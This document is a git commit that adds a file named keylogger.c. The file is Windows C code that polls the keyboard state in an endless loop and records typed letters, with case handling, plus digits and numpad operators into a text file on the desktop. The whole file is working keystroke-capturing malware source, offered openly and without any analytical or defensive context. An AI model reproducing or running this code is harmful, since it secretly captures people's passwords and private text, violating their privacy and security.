785a46c99def88f487bf73e166d7e3d0593d1e04
davidoberst <juandavidbustosperez82@gmail.com>
2025-12-08 12:07:20 -0500

    Debug

---
+++ keylogger.c
@@ -0,0 +1,85 @@
+# include <stdio.h>
+# include <windows.h>
+int main(){
+ //Create file.txt
+ const char *route = ("C:\\Users\\USUARIO\\Desktop\\file.txt");
+ FILE *f = fopen(route, "w"); //f is file
+ if(f == NULL){
+  perror("Error creating file");
+  return 1;
+ }
+
+ //Keys [A-Z,a-z,1-9]
+
+ char mayusArr[] = {
+    'A','B','C','D','E','F','G','H','I','J','K','L','M',
+    'N','O','P','Q','R','S','T','U','V','W','X','Y','Z' 
+ };
+char minusArr[] = {
+    'a','b','c','d','e','f','g','h','i','j','k','l','m',
+    'n','o','p','q','r','s','t','u','v','w','x','y','z'
+};
+
+char numsArr[] = {
+'0','1','2','3','4','5','6','7','8','9'
+};
+
+char operatorsArr[] = {'+', '-', '*', '/', '%', '='
+};
+while(1){
+    
+ int mayusArrLen = sizeof(mayusArr) / sizeof(mayusArr[0]); // MayusArray Length
+ int minusArrLen = sizeof(minusArr) / sizeof(minusArr[0]); // MinusArray Lenght
+ int numsArrLen = sizeof(numsArr) / sizeof(numsArr[0]); // Numerical chars
+ int operatorsArrLen = sizeof(operatorsArr) / sizeof(operatorsArr[0]);
+
+ int BlocMayus = GetKeyState(VK_CAPITAL) & 0x0001; // (0x0001) is the key on?
+ int shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? 1 : 0;
+ for(int x = 0; x<mayusArrLen;x++){
+ if(GetAsyncKeyState(mayusArr[x]) & 0x8000 ){
+  if(BlocMayus ^ shiftPressed){
+   fprintf(f, "%c", mayusArr[x]);
+   fflush(f);
+  }else{
+   fprintf(f, "%c", minusArr[x]);
+   fflush(f);
+  }
+  }
+  }
+
+ for(int z = 0; z<numsArrLen;z++){//Numpad Keys
+  if(GetAsyncKeyState(VK_NUMPAD0 + z) & 0x8000){
+  fprintf(f,"%c",numsArr[z]);
+  fflush(f);
+  }
+ }
+
+ for(int x = 0 ; x<numsArrLen;x++){ //Nums (Superior Keyboard)
+ if(GetAsyncKeyState(numsArr[x])){
+  fprintf(f,"%c",numsArr[x]);
+  fflush(f);
+  }
+ }
+ //Numpad operators [+-/*.]
+ if(GetAsyncKeyState(VK_MULTIPLY) & 0x8000){ 
+  fprintf(f, "*");
+  fflush(f);
+ }else if(GetAsyncKeyState(VK_ADD) & 0x8000){
+   fprintf(f, "+");
+   fflush(f);
+ }else if(GetAsyncKeyState(VK_SUBTRACT) & 0x8000){
+   fprintf(f, "-");
+   fflush(f);
+ }else if(GetAsyncKeyState(VK_DECIMAL) & 0X8000){
+   fprintf(f, ".");
+   fflush(f);
+ }else if(GetAsyncKeyState(VK_DIVIDE) &0x8000){
+    fprintf(f, "/");
+    fflush(f);
+ }
+
+}//while
+return 0;
+}//main
+
+
